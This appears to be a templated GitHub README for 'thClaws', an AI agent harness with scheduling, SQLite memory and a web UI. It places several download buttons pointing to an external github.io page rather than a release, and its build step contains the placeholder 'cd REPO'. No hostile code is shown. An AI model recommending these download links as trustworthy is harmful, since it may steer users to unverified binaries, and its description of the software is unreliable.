# thClaws v2.4.1 - AI Agent Harness Platform 2026

> **thClaws is a Rust-based AI agent harness platform for local-first, multi-provider workflows, combining scheduling, memory, and a responsive web UI in version 2.4.1.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.4.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/nathanedwards46/thclaws-local-agent-hub?style=flat-square)](https://github.com/nathanedwards46/thclaws-local-agent-hub)

---

<p align="center">
  <a href="https://nathanedwards46.github.io/thclaws-local-agent-hub/">
    <img src="https://img.shields.io/badge/Download-thClaws%20Latest-brightgreen?style=for-the-badge" alt="Download thClaws">
  </a>
</p>

> **[Direct Download - thClaws v2.4.1](https://nathanedwards46.github.io/thclaws-local-agent-hub/)**

---

[Download Latest Build](https://nathanedwards46.github.io/thclaws-local-agent-hub/)

---

## Overview

thClaws provides a single harness for coordinating AI agents across several providers. Built with Rust, Tauri, SQLite, and a web UI, it supports local-first execution while still working with external model services like Claude and OpenAI, plus local models.

Rather than acting as a simple prompt runner, the platform is meant for structured agent work. Scheduling, durable memory, audit logging, and an extension-friendly layout make it suitable for repeatable automation, traceability, and deeper integrations.

---

## Core Capabilities

- Local-first operation so agent workflows can run close to your own environment
- Multi-provider orchestration for Claude, OpenAI, and local models
- Agent scheduling for recurring jobs and ordered execution
- Persistent memory powered by SQLite for retaining context over time
- Plugin architecture that makes custom tools and behaviors easier to add
- Audit logging to preserve a record of system activity and actions
- Rate limiting controls for shaping request flow and provider usage
- REST API, CLI, and responsive web UI for working across different usage styles

---

## Installation

Clone the repository and compile it with the Rust toolchain:

```bash
git clone https://github.com/nathanedwards46/thclaws-local-agent-hub.git
cd REPO
cargo build --release
```

Once the build completes, start the desktop or service entry point that fits your environment, or launch the CLI/API components as needed.

If you would rather use a packaged release, follow the download link above to fetch the latest artifact.

---

## Using thClaws

How you interact with thClaws will depend on whether you prefer the CLI, the REST API, or the web interface.

Example workflow:

1. Start the application or service.
2. Configure your provider(s), memory storage, and rate limits.
3. Create or import an agent workflow.
4. Schedule tasks or run them manually.
5. Review audit logs and stored context as needed.

Example CLI-style launch pattern:

```bash
./thclaws
```

For the web interface, open the local Tauri-backed app or the served UI after startup, then manage agents from the dashboard.

---

## Configuration

Settings are usually stored alongside the runtime configuration and the SQLite-backed data store. The exact paths can differ depending on deployment, but typical options cover provider credentials, scheduling rules, memory settings, logging preferences, and rate limits.

Example structure:

```toml
[providers]
default = "openai"

[memory]
enabled = true

[logging]
audit = true

[scheduling]
enabled = true
```

If plugins are in use, put them in the location expected by your runtime and register them through application settings or startup flags.

---

## Requirements

- Rust toolchain for building from source
- A supported desktop or server environment for running the harness
- SQLite for persistent memory and local storage
- Access to one or more AI providers if you plan to use remote models
- Tauri-compatible runtime support for the desktop UI path

---

## FAQ

**Can thClaws work with more than one provider?**  
Yes. Multi-provider orchestration is part of the platform design, covering both remote and local models.

**Is it possible to use it without a remote dependency?**  
Yes. Local-first workflows are a core part of how the project is intended to run.

**Where are the settings kept?**  
Check the application configuration and runtime data locations used by your installation. The main areas are provider, memory, logging, and scheduling settings.

**What if an agent does not start?**  
Review scheduler status, rate limits, provider configuration, and any plugin requirements. Audit logs are useful for tracing the failure.

**How do I update to a newer build?**  
Use the download link above for the latest build, or clone the repository and rebuild from source when a new version is published.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
